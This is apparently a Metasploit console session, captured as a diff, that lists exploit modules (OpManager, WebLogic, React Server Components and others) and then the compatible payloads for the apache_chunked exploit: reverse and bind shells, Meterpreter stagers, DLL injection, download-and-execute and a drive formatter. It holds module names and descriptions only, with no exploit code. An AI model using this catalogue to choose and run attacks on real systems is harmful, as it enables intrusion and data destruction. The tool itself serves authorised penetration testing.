+   64   exploit/windows/http/manage_engine_opmanager_rce                                                     2015-09-14       manual     Yes    ManageEngine OpManager Remote Code Execution
+   65   exploit/windows/browser/ms10_046_shortcut_icon_dllloader                                             2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
+   66   exploit/windows/smb/ms10_046_shortcut_icon_dllloader                                                 2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
+   67   exploit/multi/http/openfire_auth_bypass                                                              2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
+   68     \_ target: Java Universal                                                                          .                .          .      .
+   69     \_ target: Windows x86 (Native Payload)                                                            .                .          .      .
+   70     \_ target: Linux x86 (Native Payload)                                                              .                .          .      .
+   71   exploit/multi/http/oracle_weblogic_wsat_deserialization_rce                                          2017-10-19       excellent  No     Oracle WebLogic wls-wsat Component Deserialization RCE
+   72     \_ target: Windows Command payload                                                                 .                .          .      .
+   73     \_ target: Unix Command payload                                                                    .                .          .      .
+   74   exploit/windows/misc/remote_mouse_rce                                                                2019-04-15       normal     Yes    Remote Mouse RCE
+   75   exploit/multi/http/stunshell_exec                                                                    2013-03-23       great      Yes    STUNSHELL Web Shell Remote Code Execution
+   76     \_ target: stunshell / Unix                                                                        .                .          .      .
+   77     \_ target: stunshell / Windows                                                                     .                .          .      .
+   78   exploit/multi/http/stunshell_eval                                                                    2013-03-23       great      Yes    STUNSHELL Web Shell Remote PHP Code Execution
+   79   exploit/apple_ios/browser/safari_jit                                                                 2016-08-25       good       No     Safari Webkit JIT Exploit for iOS 7.1.2
+   80   exploit/linux/local/sudoedit_bypass_priv_esc                                                         2023-01-18       excellent  Yes    Sudoedit Extra Arguments Priv Esc
+   81   exploit/linux/http/trueonline_p660hn_v2_rce                                                          2016-12-26       excellent  Yes    TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection
+   82   exploit/windows/browser/ultraoffice_httpupload                                                       2008-08-27       good       No     Ultra Shareware Office Control ActiveX HttpUpload Buffer Overflow
+   83   exploit/multi/http/react2shell_unauth_rce_cve_2025_55182                                             2025-12-03       excellent  Yes    Unauthenticated RCE in React Server Components (React2Shell)
+   84     \_ target: Next.js - Unix Command                                                                  .                .          .      .
+   85     \_ target: Next.js - Windows Command                                                               .                .          .      .
+   86     \_ target: Waku - Unix Command                                                                     .                .          .      .
+   87     \_ target: Waku - Windows Command                                                                  .                .          .      .
+   88   exploit/linux/local/vmware_mount                                                                     2013-08-22       excellent  Yes    VMWare Setuid vmware-mount Unsafe popen(3)
+   89   exploit/multi/http/webnms_file_upload                                                                2016-07-04       excellent  Yes    WebNMS Framework Server Arbitrary File Upload
+   90     \_ target: Automatic                                                                               .                .          .      .
+   91     \_ target: WebNMS Framework Server 5.2 / 5.2 SP1 - Linux                                           .                .          .      .
+   92     \_ target: WebNMS Framework Server 5.2 / 5.2 SP1 - Windows                                         .                .          .      .
+   93   exploit/windows/local/bypassuac_windows_store_filesys                                                2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
+   94   exploit/unix/webapp/wp_wysija_newsletters_upload                                                     2014-07-01       excellent  Yes    Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload
+   95   exploit/multi/local/xorg_x11_suid_server                                                             2018-10-25       good       Yes    Xorg X11 Server SUID logfile Privilege Escalation
+   96     \_ target: OpenBSD                                                                                 .                .          .      .
+   97     \_ target: Linux x64                                                                               .                .          .      .
+   98     \_ target: Linux x86                                                                               .                .          .      .
+   99   exploit/windows/misc/mirc_privmsg_server                                                             2008-10-02       normal     No     mIRC PRIVMSG Handling Stack Buffer Overflow
+   100  exploit/osx/local/mac_dirty_cow                                                                      2022-12-17       excellent  Yes    macOS Dirty Cow Arbitrary File Write Local Privilege Escalation
+   101  exploit/linux/http/rconfig_vendors_auth_file_upload_rce                                              2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
+
+
+Interact with a module by name or index. For example info 101, use 101 or use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> show payload
+[-] Invalid parameter "payload", use "show -h" for more information
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> show payloads
+
+Compatible Payloads
+===================
+
+   #    Name                                                        Disclosure Date  Rank    Check  Description
+   -    ----                                                        ---------------  ----    -----  -----------
+   0    payload/generic/custom                                      .                normal  No     Custom Payload
+   1    payload/generic/debug_trap                                  .                normal  No     Generic x86 Debug Trap
+   2    payload/generic/shell_bind_aws_ssm                          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3    payload/generic/shell_bind_tcp                              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4    payload/generic/shell_reverse_tcp                           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5    payload/generic/ssh/interact                                .                normal  No     Interact with Established SSH Connection
+   6    payload/generic/tight_loop                                  .                normal  No     Generic x86 Tight Loop
+   7    payload/windows/adduser                                     .                normal  No     Windows Execute net user /ADD
+   8    payload/windows/custom/bind_hidden_ipknock_tcp              .                normal  No     Windows shellcode stage, Hidden Bind Ipknock TCP Stager
+   9    payload/windows/custom/bind_hidden_tcp                      .                normal  No     Windows shellcode stage, Hidden Bind TCP Stager
+   10   payload/windows/custom/bind_ipv6_tcp                        .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager (Windows x86)
+   11   payload/windows/custom/bind_ipv6_tcp_uuid                   .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   12   payload/windows/custom/bind_named_pipe                      .                normal  No     Windows shellcode stage, Windows x86 Bind Named Pipe Stager
+   13   payload/windows/custom/bind_nonx_tcp                        .                normal  No     Windows shellcode stage, Bind TCP Stager (No NX or Win7)
+   14   payload/windows/custom/bind_tcp                             .                normal  No     Windows shellcode stage, Bind TCP Stager (Windows x86)
+   15   payload/windows/custom/bind_tcp_rc4                         .                normal  No     Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   16   payload/windows/custom/bind_tcp_uuid                        .                normal  No     Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x86)
+   17   payload/windows/custom/reverse_http                         .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (wininet)
+   18   payload/windows/custom/reverse_http_proxy_pstore            .                normal  No     Windows shellcode stage, Reverse HTTP Stager Proxy
+   19   payload/windows/custom/reverse_https                        .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (wininet)
+   20   payload/windows/custom/reverse_ipv6_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (IPv6)
+   21   payload/windows/custom/reverse_named_pipe                   .                normal  No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   22   payload/windows/custom/reverse_nonx_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (No NX or Win7)
+   23   payload/windows/custom/reverse_ord_tcp                      .                normal  No     Windows shellcode stage, Reverse Ordinal TCP Stager (No NX or Win7)
+   24   payload/windows/custom/reverse_tcp                          .                normal  No     Windows shellcode stage, Reverse TCP Stager
+   25   payload/windows/custom/reverse_tcp_allports                 .                normal  No     Windows shellcode stage, Reverse All-Port TCP Stager
+   26   payload/windows/custom/reverse_tcp_dns                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (DNS)
+   27   payload/windows/custom/reverse_tcp_rc4                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   28   payload/windows/custom/reverse_tcp_rc4_dns                  .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   29   payload/windows/custom/reverse_tcp_uuid                     .                normal  No     Windows shellcode stage, Reverse TCP Stager with UUID Support
+   30   payload/windows/custom/reverse_udp                          .                normal  No     Windows shellcode stage, Reverse UDP Stager with UUID Support
+   31   payload/windows/custom/reverse_winhttp                      .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (winhttp)
+   32   payload/windows/custom/reverse_winhttps                     .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (winhttp)
+   33   payload/windows/dllinject/bind_hidden_ipknock_tcp           .                normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   34   payload/windows/dllinject/bind_hidden_tcp                   .                normal  No     Reflective DLL Injection, Hidden Bind TCP Stager
+   35   payload/windows/dllinject/bind_ipv6_tcp                     .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   36   payload/windows/dllinject/bind_ipv6_tcp_uuid                .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   37   payload/windows/dllinject/bind_named_pipe                   .                normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager
+   38   payload/windows/dllinject/bind_nonx_tcp                     .                normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   39   payload/windows/dllinject/bind_tcp                          .                normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   40   payload/windows/dllinject/bind_tcp_rc4                      .                normal  No     Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   41   payload/windows/dllinject/bind_tcp_uuid                     .                normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   42   payload/windows/dllinject/reverse_http                      .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   43   payload/windows/dllinject/reverse_http_proxy_pstore         .                normal  No     Reflective DLL Injection, Reverse HTTP Stager Proxy
+   44   payload/windows/dllinject/reverse_ipv6_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   45   payload/windows/dllinject/reverse_nonx_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   46   payload/windows/dllinject/reverse_ord_tcp                   .                normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   47   payload/windows/dllinject/reverse_tcp                       .                normal  No     Reflective DLL Injection, Reverse TCP Stager
+   48   payload/windows/dllinject/reverse_tcp_allports              .                normal  No     Reflective DLL Injection, Reverse All-Port TCP Stager
+   49   payload/windows/dllinject/reverse_tcp_dns                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
+   50   payload/windows/dllinject/reverse_tcp_rc4                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   51   payload/windows/dllinject/reverse_tcp_rc4_dns               .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   52   payload/windows/dllinject/reverse_tcp_uuid                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   53   payload/windows/dllinject/reverse_winhttp                   .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+   54   payload/windows/dns_txt_query_exec                          .                normal  No     DNS TXT Record Payload Download and Execution
+   55   payload/windows/download_exec                               .                normal  No     Windows Executable Download (http,https,ftp) and Execute
+   56   payload/windows/exec                                        .                normal  No     Windows Execute Command
+   57   payload/windows/format_all_drives                           .                manual  No     Windows Drive Formatter
+   58   payload/windows/loadlibrary                                 .                normal  No     Windows LoadLibrary Path
+   59   payload/windows/messagebox                                  .                normal  No     Windows MessageBox
+   60   payload/windows/meterpreter/bind_hidden_ipknock_tcp         .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   61   payload/windows/meterpreter/bind_hidden_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   62   payload/windows/meterpreter/bind_ipv6_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   63   payload/windows/meterpreter/bind_ipv6_tcp_uuid              .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   64   payload/windows/meterpreter/bind_named_pipe                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   65   payload/windows/meterpreter/bind_nonx_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   66   payload/windows/meterpreter/bind_tcp                        .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   67   payload/windows/meterpreter/bind_tcp_rc4                    .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   68   payload/windows/meterpreter/bind_tcp_uuid                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   69   payload/windows/meterpreter/reverse_http                    .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   70   payload/windows/meterpreter/reverse_http_proxy_pstore       .                normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTP Stager Proxy
+   71   payload/windows/meterpreter/reverse_https                   .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   72   payload/windows/meterpreter/reverse_ipv6_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   73   payload/windows/meterpreter/reverse_named_pipe              .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   74   payload/windows/meterpreter/reverse_nonx_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   75   payload/windows/meterpreter/reverse_ord_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   76   payload/windows/meterpreter/reverse_tcp                     .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   77   payload/windows/meterpreter/reverse_tcp_allports            .                normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   78   payload/windows/meterpreter/reverse_tcp_dns                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   79   payload/windows/meterpreter/reverse_tcp_rc4                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   80   payload/windows/meterpreter/reverse_tcp_rc4_dns             .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   81   payload/windows/meterpreter/reverse_tcp_uuid                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   82   payload/windows/meterpreter/reverse_winhttp                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   83   payload/windows/meterpreter/reverse_winhttps                .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+   84   payload/windows/metsvc_bind_tcp                             .                normal  No     Windows Meterpreter Service, Bind TCP
+   85   payload/windows/metsvc_reverse_tcp                          .                normal  No     Windows Meterpreter Service, Reverse TCP Inline
+   86   payload/windows/patchupdllinject/bind_hidden_ipknock_tcp    .                normal  No     Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   87   payload/windows/patchupdllinject/bind_hidden_tcp            .                normal  No     Windows Inject DLL, Hidden Bind TCP Stager
+   88   payload/windows/patchupdllinject/bind_ipv6_tcp              .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   89   payload/windows/patchupdllinject/bind_ipv6_tcp_uuid         .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   90   payload/windows/patchupdllinject/bind_named_pipe            .                normal  No     Windows Inject DLL, Windows x86 Bind Named Pipe Stager
+   91   payload/windows/patchupdllinject/bind_nonx_tcp              .                normal  No     Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   92   payload/windows/patchupdllinject/bind_tcp                   .                normal  No     Windows Inject DLL, Bind TCP Stager (Windows x86)
+   93   payload/windows/patchupdllinject/bind_tcp_rc4               .                normal  No     Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   94   payload/windows/patchupdllinject/bind_tcp_uuid              .                normal  No     Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   95   payload/windows/patchupdllinject/reverse_ipv6_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (IPv6)
+   96   payload/windows/patchupdllinject/reverse_nonx_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   97   payload/windows/patchupdllinject/reverse_ord_tcp            .                normal  No     Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   98   payload/windows/patchupdllinject/reverse_tcp                .                normal  No     Windows Inject DLL, Reverse TCP Stager
+   99   payload/windows/patchupdllinject/reverse_tcp_allports       .                normal  No     Windows Inject DLL, Reverse All-Port TCP Stager
+   100  payload/windows/patchupdllinject/reverse_tcp_dns            .                normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)
+   101  payload/windows/patchupdllinject/reverse_tcp_rc4            .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   102  payload/windows/patchupdllinject/reverse_tcp_rc4_dns        .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   103  payload/windows/patchupdllinject/reverse_tcp_uuid           .                normal  No     Windows Inject DLL, Reverse TCP Stager with UUID Support
+   104  payload/windows/patchupmeterpreter/bind_hidden_ipknock_tcp  .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   105  payload/windows/patchupmeterpreter/bind_hidden_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   106  payload/windows/patchupmeterpreter/bind_ipv6_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   107  payload/windows/patchupmeterpreter/bind_ipv6_tcp_uuid       .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   108  payload/windows/patchupmeterpreter/bind_named_pipe          .                normal  No     Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager
+   109  payload/windows/patchupmeterpreter/bind_nonx_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   110  payload/windows/patchupmeterpreter/bind_tcp                 .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   111  payload/windows/patchupmeterpreter/bind_tcp_rc4             .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   112  payload/windows/patchupmeterpreter/bind_tcp_uuid            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   113  payload/windows/patchupmeterpreter/reverse_ipv6_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   114  payload/windows/patchupmeterpreter/reverse_nonx_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   115  payload/windows/patchupmeterpreter/reverse_ord_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   116  payload/windows/patchupmeterpreter/reverse_tcp              .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   117  payload/windows/patchupmeterpreter/reverse_tcp_allports     .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   118  payload/windows/patchupmeterpreter/reverse_tcp_dns          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   119  payload/windows/patchupmeterpreter/reverse_tcp_rc4          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   120  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns      .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   121  payload/windows/patchupmeterpreter/reverse_tcp_uuid         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   122  payload/windows/peinject/bind_hidden_ipknock_tcp            .                normal  No     Windows Inject PE Files, Hidden Bind Ipknock TCP Stager
+   123  payload/windows/peinject/bind_hidden_tcp                    .                normal  No     Windows Inject PE Files, Hidden Bind TCP Stager
+   124  payload/windows/peinject/bind_ipv6_tcp                      .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager (Windows x86)
+   125  payload/windows/peinject/bind_ipv6_tcp_uuid                 .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   126  payload/windows/peinject/bind_named_pipe                    .                normal  No     Windows Inject PE Files, Windows x86 Bind Named Pipe Stager
+   127  payload/windows/peinject/bind_nonx_tcp                      .                normal  No     Windows Inject PE Files, Bind TCP Stager (No NX or Win7)
+   128  payload/windows/peinject/bind_tcp                           .                normal  No     Windows Inject PE Files, Bind TCP Stager (Windows x86)
+   129  payload/windows/peinject/bind_tcp_rc4                       .                normal  No     Windows Inject PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   130  payload/windows/peinject/bind_tcp_uuid                      .                normal  No     Windows Inject PE Files, Bind TCP Stager with UUID Support (Windows x86)
+   131  payload/windows/peinject/reverse_ipv6_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (IPv6)
+   132  payload/windows/peinject/reverse_named_pipe                 .                normal  No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
+   133  payload/windows/peinject/reverse_nonx_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (No NX or Win7)
+   134  payload/windows/peinject/reverse_ord_tcp                    .                normal  No     Windows Inject PE Files, Reverse Ordinal TCP Stager (No NX or Win7)
+   135  payload/windows/peinject/reverse_tcp                        .                normal  No     Windows Inject PE Files, Reverse TCP Stager
+   136  payload/windows/peinject/reverse_tcp_allports               .                normal  No     Windows Inject PE Files, Reverse All-Port TCP Stager
+   137  payload/windows/peinject/reverse_tcp_dns                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (DNS)
+   138  payload/windows/peinject/reverse_tcp_rc4                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   139  payload/windows/peinject/reverse_tcp_rc4_dns                .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   140  payload/windows/peinject/reverse_tcp_uuid                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager with UUID Support
+   141  payload/windows/pingback_bind_tcp                           .                normal  No     Windows x86 Pingback, Bind TCP Inline
+   142  payload/windows/pingback_reverse_tcp                        .                normal  No     Windows x86 Pingback, Reverse TCP Inline
+   143  payload/windows/powershell_bind_tcp                         .                normal  No     Windows Interactive Powershell Session, Bind TCP
+   144  payload/windows/powershell_reverse_tcp                      .                normal  No     Windows Interactive Powershell Session, Reverse TCP
+   145  payload/windows/powershell_reverse_tcp_ssl                  .                normal  No     Windows Interactive Powershell Session, Reverse TCP SSL
+   146  payload/windows/shell/bind_hidden_ipknock_tcp               .                normal  No     Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   147  payload/windows/shell/bind_hidden_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Stager
+   148  payload/windows/shell/bind_ipv6_tcp                         .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   149  payload/windows/shell/bind_ipv6_tcp_uuid                    .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   150  payload/windows/shell/bind_named_pipe                       .                normal  No     Windows Command Shell, Windows x86 Bind Named Pipe Stager
+   151  payload/windows/shell/bind_nonx_tcp                         .                normal  No     Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   152  payload/windows/shell/bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Stager (Windows x86)
+   153  payload/windows/shell/bind_tcp_rc4                          .                normal  No     Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   154  payload/windows/shell/bind_tcp_uuid                         .                normal  No     Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   155  payload/windows/shell/reverse_ipv6_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (IPv6)
+   156  payload/windows/shell/reverse_nonx_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   157  payload/windows/shell/reverse_ord_tcp                       .                normal  No     Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   158  payload/windows/shell/reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Stager
+   159  payload/windows/shell/reverse_tcp_allports                  .                normal  No     Windows Command Shell, Reverse All-Port TCP Stager
+   160  payload/windows/shell/reverse_tcp_dns                       .                normal  No     Windows Command Shell, Reverse TCP Stager (DNS)
+   161  payload/windows/shell/reverse_tcp_rc4                       .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   162  payload/windows/shell/reverse_tcp_rc4_dns                   .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   163  payload/windows/shell/reverse_tcp_uuid                      .                normal  No     Windows Command Shell, Reverse TCP Stager with UUID Support
+   164  payload/windows/shell/reverse_udp                           .                normal  No     Windows Command Shell, Reverse UDP Stager with UUID Support
+   165  payload/windows/shell_bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Inline
+   166  payload/windows/shell_bind_tcp_xpfw                         .                normal  No     Windows Disable Windows ICF, Command Shell, Bind TCP Inline
+   167  payload/windows/shell_hidden_bind_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Inline
+   168  payload/windows/shell_reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Inline
+   169  payload/windows/speak_pwned                                 .                normal  No     Windows Speech API - Say "You Got Pwned!"
+   170  payload/windows/upexec/bind_hidden_ipknock_tcp              .                normal  No     Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   171  payload/windows/upexec/bind_hidden_tcp                      .                normal  No     Windows Upload/Execute, Hidden Bind TCP Stager
+   172  payload/windows/upexec/bind_ipv6_tcp                        .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   173  payload/windows/upexec/bind_ipv6_tcp_uuid                   .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   174  payload/windows/upexec/bind_named_pipe                      .                normal  No     Windows Upload/Execute, Windows x86 Bind Named Pipe Stager
+   175  payload/windows/upexec/bind_nonx_tcp                        .                normal  No     Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   176  payload/windows/upexec/bind_tcp                             .                normal  No     Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   177  payload/windows/upexec/bind_tcp_rc4                         .                normal  No     Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   178  payload/windows/upexec/bind_tcp_uuid                        .                normal  No     Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   179  payload/windows/upexec/reverse_ipv6_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   180  payload/windows/upexec/reverse_nonx_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   181  payload/windows/upexec/reverse_ord_tcp                      .                normal  No     Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   182  payload/windows/upexec/reverse_tcp                          .                normal  No     Windows Upload/Execute, Reverse TCP Stager
+   183  payload/windows/upexec/reverse_tcp_allports                 .                normal  No     Windows Upload/Execute, Reverse All-Port TCP Stager
+   184  payload/windows/upexec/reverse_tcp_dns                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)
+   185  payload/windows/upexec/reverse_tcp_rc4                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   186  payload/windows/upexec/reverse_tcp_rc4_dns                  .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   187  payload/windows/upexec/reverse_tcp_uuid                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   188  payload/windows/upexec/reverse_udp                          .                normal  No     Windows Upload/Execute, Reverse UDP Stager with UUID Support
+   189  payload/windows/vncinject/bind_hidden_ipknock_tcp           .                normal  No     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   190  payload/windows/vncinject/bind_hidden_tcp                   .                normal  No     VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   191  payload/windows/vncinject/bind_ipv6_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   192  payload/windows/vncinject/bind_ipv6_tcp_uuid                .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   193  payload/windows/vncinject/bind_named_pipe                   .                normal  No     VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   194  payload/windows/vncinject/bind_nonx_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   195  payload/windows/vncinject/bind_tcp                          .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   196  payload/windows/vncinject/bind_tcp_rc4                      .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   197  payload/windows/vncinject/bind_tcp_uuid                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
